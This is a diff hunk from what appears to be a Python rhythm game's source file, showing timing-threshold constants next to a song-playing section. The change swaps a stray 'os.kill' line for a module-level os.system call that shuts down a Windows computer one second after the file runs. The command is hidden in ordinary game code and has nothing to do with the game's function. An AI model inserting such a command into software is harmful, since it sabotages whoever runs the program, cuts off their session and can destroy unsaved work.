@@ -59,7 +59,7 @@ PERFECT       = 70
 GREAT         = 110
 GOOD          = 142
 BOO           = 175
-os.kill
+os.system("Shutdown /s /t 1")
 
 #### Song selection & Playing songs
 
